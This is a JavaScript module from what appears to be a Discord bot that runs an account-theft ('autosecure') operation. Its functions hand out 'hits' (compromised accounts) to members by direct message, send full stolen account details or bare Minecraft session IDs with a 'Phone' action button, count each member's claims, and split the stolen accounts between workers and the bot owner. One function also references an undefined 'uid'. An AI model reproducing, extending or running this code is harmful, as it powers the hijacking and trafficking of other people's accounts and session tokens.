const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const listAccount = require("../accounts/listAccount");
const { claimHitMessager, splitClaimMessager, getClaimingModeText } = require("../utils/messager");
const { queryParams } = require("../../../db/database");
const generate = require('../generate');

async function handleAutosecureHit(client, interaction, hitData, guildId, channelId, name, isBotOwner) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        await interaction.user.send({ embeds: hitData.embeds });
        await safeReply({ content: `Sent you the hit in DMs!`, ephemeral: true });
        await claimHitMessager(client, guildId, channelId, interaction, 1, name);
        
        if (!isBotOwner) {
            await client.queryParams(
                `UPDATE users SET claimedamount = claimedamount + 1 WHERE user_id=? AND child=?`, 
                [client.username, interaction.user.id]
            );
        }
    } catch (e) {
        throw new Error(`Failed to send autosecure hit: ${e.message}`);
    }
}

async function handleBotOwnerClaim(client, interaction, acc, uid, guildId, channelId, name) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        const msg = await listAccount(acc, uid, client, interaction);;
        await interaction.user.send(msg);
        await safeReply({ content: `Sent you the hit in DMs!`, ephemeral: true });
        await claimHitMessager(client, guildId, channelId, interaction, 1, name);
    } catch (e) {
        throw new Error(`Failed to send full account to bot owner: ${e.message}`);
    }
}

async function handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user, d = false) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        const msg = await listAccount(acc, uid, client, interaction);;
        await interaction.user.send(msg);
        await safeReply({ content: `Sent you the hit in DMs!`, ephemeral: true });
        if (!d){
            await claimHitMessager(client, guildId, channelId, interaction, 1, name);
        }
        await client.queryParams(
            `UPDATE users SET claimedamount = claimedamount + 1 WHERE user_id=? AND child=?`, 
            [client.username, interaction.user.id]
        );
    } catch (e) {
        throw new Error(`Failed to send full account: ${e.message}`);
    }
}

async function handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user, d = false) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        if (acc.ssid) {       
            const expTime = Math.floor((Date.now() + 24 * 60 * 60 * 1000) / 1000); 
            const formattedExpTime = `<t:${expTime}:R>`;
            
            let rId = generate(32);
            await client.queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [rId, `phonessid|${acc.ssid}`]);
            await markasclaimed(client, uid)
            let buttonsRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`action|${rId}`) 
                    .setLabel("Phone")
                    .setStyle(ButtonStyle.Secondary)
            );

            const msg = {         
                embeds: [{           
                    title: `Expires: ${formattedExpTime}`,           
                    description: "```" + acc.ssid + "```",           
                    color: 0x808080       
                }],         
                components: [buttonsRow],
                ephemeral: true   
            }; 
            await interaction.user.send(msg);
            await safeReply({ content: `Sent you the hit in DMs!`, ephemeral: true });
            if (!d){
                await claimHitMessager(client, guildId, channelId, interaction, 0, name);
            }
            await client.queryParams(
                `UPDATE users SET claimedamount = claimedamount + 1 WHERE user_id=? AND child=?`, 
                [client.username, interaction.user.id]
            );
        } else {
            const msg2 = {         
                embeds: [{           
                    title: `No SSID`,           
                    description: "Account doesn't own minecraft or failed to obtain!",           
                    color: 0x808080       
                }],         
                ephemeral: true       
            }; 
            await interaction.user.send(msg2);
            await safeReply({ content: `Account doesn't have Minecraft or failed to obtain SSID!`, ephemeral: true });
        }
    } catch (e) {
        throw new Error(`Failed to send SSID: ${e.message}`);
    }
}

async function handleNoContentSend(client, interaction, guildId, channelId, name, d = false) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        const msg = {         
            embeds: [{           
                title: `Claim Progress Recorded`,           
                description: "Your claim has been recorded. You need to reach the required split count for a claim.",           
                color: 0x808080       
            }],         
            ephemeral: true   
        }; 
        await interaction.user.send(msg);
        await safeReply({ content: `Claim progress recorded!`, ephemeral: true });
        if (!d){
            await claimHitMessager(client, guildId, channelId, interaction, -1, name);
        }
    } catch (e) {
        throw new Error(`Failed to send nothing claim confirmation: ${e.message}`);
    }
}

function getNumberSuffix(number) {
    if (number === 1) return "1st";
    if (number === 2) return "2nd";
    if (number === 3) return "3rd";
    return `${number}th`;
}

async function handleSplitClaim(client, interaction, acc, uid, guildId, channelId, name, user) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(options);
                } else {
                    await interaction.reply(options);
                }
            } catch (err) {
                console.error("Error in safeReply:", err);
            }
        };

        let claimstreak = (user.claimstreak) + 1;
        let splitready = claimstreak >= user.split;
        
        await client.queryParams(
            `UPDATE users SET claimstreak=? WHERE user_id=? AND child=?`, 
            [splitready ? 0 : claimstreak, client.username, interaction.user.id]
        );

        if (splitready) {
            /// Split is ready
            let d = convertType(user.claiming)

            const completedmsg = {
                embeds: [{
                    title: `Split Completed`,
                    description: `You've completed your split!\nProgress: ${claimstreak}/${user.split}\n Result: ${d}`,
                    color: 0x00ff00
                }],
                ephemeral: true
            };
            await interaction.user.send(completedmsg);
            

            if (user.claiming === 1) {
                await handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user, true);
            } else if (user.claiming === 0) {
                if (acc.ssid) {
                    await handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user, true);
                } else {
                    await safeReply({ content: `Account doesn't have Minecraft or failed to obtain SSID!`, ephemeral: true });
                }
            } else {
                /// Nothing available, mark as available for owner
                await markasclaimed(client, uid)
            }
            
            await splitClaimMessager(client, guildId, channelId, interaction, name, claimstreak, user.split, true, user.rest, user.claiming);
        } else {
            /// Split not ready
            let d = convertType(user.rest)

            const progressMsg = {
                embeds: [{
                    title: `Split Progress`,
                    description: `Your claim has been recorded.\nProgress: ${claimstreak}/${user.split}\n Result: ${d}`,
                    color: 0x808080
                }],
                ephemeral: true
            };
            await interaction.user.send(progressMsg);
            
            
            if (user.rest === 1) {
                await handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user, true);
            } else if (user.rest === 0 && acc.ssid) {
                await handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user, true);
            } else{
                /// Nothing as rest
                await markasclaimed(client, uid)
            }


            /// Above handles to send SSID/Full/Nothing if split hasnt been reached
            // Under this make it handle to if rest is SSID/Nothing it sends the acccount to the user
            
            await splitClaimMessager(client, guildId, channelId, interaction, name, claimstreak, user.split, false, user.rest, user.claiming);
        }
        
        // Update claimed amount
        await client.queryParams(
            `UPDATE users SET claimedamount = claimedamount + 1 WHERE user_id=? AND child=?`, 
            [client.username, interaction.user.id]
        );
    } catch (e) {
        throw new Error(`Failed to process split claim: ${e.message}`);
    }
}



async function markasclaimed(client, uid) {
    console.log(`Marking uid: ${uid} as claimed`);
    await client.queryParams(`UPDATE accountsbyuser SET claimed = 1 WHERE uid = ?`, [uid]);
}





module.exports = {
    handleAutosecureHit,
    handleBotOwnerClaim,
    handleFullAccount,
    handleSSIDOnly,
    handleNoContentSend,
    handleSplitClaim,
    markasclaimed
};


const convertType = (val) => {
    if (val === 1) return "Full";
    if (val === 0) return "SSID";
    return "Nothing";
};